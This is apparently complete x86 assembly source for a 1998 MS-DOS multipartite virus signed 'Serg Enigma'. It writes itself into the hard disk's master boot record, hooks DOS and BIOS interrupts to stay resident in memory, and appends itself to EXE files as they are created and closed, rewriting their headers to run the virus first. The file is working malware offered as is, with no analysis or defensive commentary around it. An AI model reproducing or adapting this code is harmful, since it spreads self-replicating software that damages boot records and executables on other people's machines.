   ;14:10 16.06.1998
   ;Copyright by Serg Enigma

       .model tiny
       .186
       .code
       org 0h
   start:
       call delta
   _delta:
   ;========================== BOOT CODE ========
   boot:   cli
       xor ax,ax
       mov ss,ax
       mov sp,7c00h
       mov ds,ax
       sub word ptr ds:[413h],4
       int 12h
       mov cl,6
       shl ax,cl
       push ax
       mov es,ax
       xor bx,bx
       mov ax,0204h
       mov cx,2
       mov dx,80h
       int 13h
       mov ax,offset itercept_1ch&13h&21h
       push ax
       retf
   boot_lng EQU $-offset boot
   new_i1c:
       pushf
       push ax cx ds
       xor cx,cx
       mov ds,cx
       mov ax,ds:[21h*4][2]
       cmp ah,8h
       ja non_intercept_i21
       mov ax,offset tmp_21

       xchg ax,word ptr ds:[21h*4]
       mov word ptr cs:[old_21ip],ax
       push cs
       pop ax
       xchg ax,word ptr ds:[21h*4][2]
       mov word ptr cs:[old_21cs],ax

       mov cx,cs:[old_1cip]
       mov ds:[1ch*4],cx
       mov cx,cs:[old_1ccs]
       mov ds:[1ch*4][2],cx
   non_intercept_i21:
       pop ds cx ax
       popf
       iret

   itercept_1ch&13h&21h:
       xor ax,ax
       mov ds,ax
       mov ax,offset new_i1c
       cli
       xchg ax,word ptr ds:[1ch*4]
       mov word ptr cs:[old_1cip],ax
       push cs
       pop ax
       xchg ax,word ptr ds:[1ch*4][2]
       mov word ptr cs:[old_1ccs],ax
       sti

       xor ax,ax
       mov es,ax
       push es
       mov bx,7c00h
       push bx
       mov ax,0201h
       mov cx,1234h    ;> Plase of old boot!!!
   old_boot equ $-2
       mov dx,80h
       int 13h
       retf
   ;========================== DATA =============
   int_21h:    pushf
           cli
           db  09ah
   old_21ip    dw  0
   old_21cs    dw  0
           ret

   old_1cip    dw  0
   old_1ccs    dw  0

   int_13h:    pushf
           cli
           db  09ah
   old_13ip    dw  0
   old_13cs    dw  0
           ret
   ;=============================================
   delta:
       mov ax,0deadh
       pop bp
       int 21h
       sub bp,offset _delta
       cmp di,0deadh
       jz exit_exe
   install:
       mov ax,3513h
       int 21h
       mov cs:[old_13ip][bp],bx
       mov cs:[old_13cs][bp],es
       push cs
       pop es
       push cs
       pop ds

       mov ah,8h
       mov dx,80h
       call int_13h
       and cx,3fh
       sub cx,7h
       mov word ptr cs:[old_boot],cx
       lea bx,offset old_exe_header+[bp]
       mov ax,0201h
       mov cx,1
       mov dx,80h
       call int_13h
       cmp word ptr ds:[old_exe_header+0fh][bp],12cdh
       jz already_infected_boot
       mov ax,0301h
       mov cx,word ptr ds:[old_boot]
       mov dx,80h
       call int_13h
       jc error
       mov ax,0304h    ;> how many sectors to write!!!
       mov cx,2
       lea bx,offset start+[bp]
       mov dx,80h
       call int_13h
       jc error
       mov cx,boot_lng
       lea si,offset boot+[bp]
       lea di,offset old_exe_header+[bp]
       push di
       rep movsb
       pop bx
       mov ax,0301h
       mov cx,1h
       mov dx,80h
       call int_13h
   already_infected_boot:
   error:
   exit_exe:
       mov ah,51h
       int 21h
       mov es,bx
       mov ds,bx
       mov ax,bx
       add ax,1234h
   old_exe_ss  equ $-2
       add ax,10h
       mov ss,ax
       mov sp,1234h
   old_exe_sp  equ $-2
       mov di,sp
       add bx,1234h
   old_exe_cs  equ $-2
       add bx,10h
       push bx
       mov bx,1234h
   old_exe_ip  equ $-2
       mov si,bx
       push bx
       xor ax,ax
       mov bx,ax
       xor bp,bp
       mov cx,0ffh
       mov dx,ds
       retf
       db  '[Serg Enigma]'
   tmp_21:
       pushf
       push ax bx cx dx di si es ds bp
       push cs
       pop ds
       cmp ax,4b00h
       jnz e_tmp_21
       mov ah,48h
       mov bx,(body+100)/16
       pushf
       call dword ptr cs:[old_21ip]
       jc e_tmp_21
       mov es,ax
       xor si,si
       mov di,si
       mov cx,body
       cld
       rep movsb
       dec ax
       mov ds,ax
       mov word ptr ds:[1],8
       mov ds,cx
       mov word ptr ds:[21h*4],offset new_21
       mov word ptr ds:[21h*4][2],es
       mov word ptr ds:[413h],280h
   e_tmp_21:
       pop bp ds es si di dx cx bx ax
       popf
       jmp dword ptr cs:[old_21ip]

   new_21:     pushf
           cmp ax,0deadh
           jz we_are_here
           cmp cs:[handle],0
           jnz look_close
           cmp ah,3ch
           jz test_file
           cmp ah,5bh
           jz test_file
   ret_i21h:   popf
           jmp dword ptr cs:[old_21ip]
   we_are_here:    xchg ax,di
   exit_i21h:  popf
           iret
   test_file:
           push ax bx cx dx di si es ds bp
           mov si,dx
           cld
   search:     lodsb
           or al,al
           jnz search
           sub si,5
           lodsb
           cmp al,'.'
           jnz not_my
           lodsw
           or ax,2020h
           mov cx,ax
           lodsb
           or al,20h
           cmp cx,'oc'
           jnz _exe_
           cmp al,'m'
           jmp good
   _exe_:      cmp cx,'xe'
           jnz not_my
           cmp al,'e'
   good:       jnz not_my
           pop bp ds es si di dx cx bx ax
           popf
           call int_21h
           mov cs:[handle],ax
           jnc e0001
           mov cs:[handle],0
   e0001:      retf 2

   not_my:     pop bp ds es si di dx cx bx ax
           jmp ret_i21h

   handle  dw  0

   look_close:
       cmp ah,3eh
       jz test_handle
       jmp ret_i21h
   test_handle:
       cmp cs:[handle],bx
       jz inf_proc
       jmp ret_i21h
   inf_proc:
       push ax bx cx dx di si es ds bp
       push cs
       pop ds
       mov ax,4200h
       xor dx,dx
       xor cx,cx
       call int_21h
       mov ah,3fh
       mov cx,1ch
       mov dx,offset old_exe_header
       call int_21h
       jnc look_our_files
       jmp exit_virus
       db  'Liza'
   look_our_files:
       cmp word ptr ds:[_MZ_],'ZM'
       jz infect
       cmp word ptr ds:[_MZ_],'MZ'
       jz  infect
       jmp exit_virus
       db  '34?-4732'
   infect:
       cmp ds:[CRC],'SE'
       jnz _cool
       jmp exit_virus
   _cool:  mov ds:[CRC],'SE'
       mov si,SS_offset_paragr
       mov word ptr old_exe_SS,si
       mov si,SP_offset
       mov word ptr old_exe_SP,si

       mov si,CS_offset_paragr
       mov word ptr old_exe_CS,si
       mov si,IP_offset
       mov word ptr old_exe_IP,si

       mov ax,4202h
       xor cx,cx
       xor dx,dx
       call int_21h
       xchg ax,di
       xchg dx,si

       mov ax,lng_of_file_page
       dec ax
       mov cx,200h
       mul cx
       add ax,byte_on_last_page
       adc ax,0
       cmp ax,di
       jnz exit_virus
       cmp dx,si
       jnz exit_virus
       push ax
       push dx
       mov cx,10h
       div cx
       sub ax,header_size
       mov ip_offset,dx
       mov cs_offset_paragr,ax
       add dx,body+100h
       mov sp_offset,dx
       mov ss_offset_paragr,ax
       pop dx
       pop ax
       add ax,body
       adc dx,0
       mov cx,200h
       div cx
       or dx,dx
       jz not_inc
       inc ax
   not_inc:
       mov byte_on_last_page,dx
       mov lng_of_file_page,ax
       mov ax,4202h
       xor cx,cx
       xor dx,dx
       call int_21h
       mov ah,40h
       mov cx,body
       mov dx,offset start
       call int_21h
       jc exit_virus
       mov ax,4200h
       xor cx,cx
       xor dx,dx
       call int_21h
       mov ah,40h
       mov cx,1ch
       mov dx,offset old_exe_header
       call int_21h
   exit_virus:
       pop bp ds es si di dx cx bx ax
       mov cs:[handle],0
       jmp ret_i21h

   ;tsr_lng    =   $-offset virus
   body    =   $-offset start
   old_exe_header:
   _MZ_                dw  0
   byte_on_last_page       dw  0
   lng_of_file_page        dw  0
   relocation_counter      dw  0
   header_size         dw  0
   min_paragraf            dw  0
   max_paragraf            dw  0
   SS_offset_paragr        dw  0
   SP_offset           dw  0
   CRC             dw  0
   IP_offset           dw  0
   CS_offset_paragr        dw  0
   relocation_offset       dw  0
   overlay_number          db  0

   _end:
   end start
   end
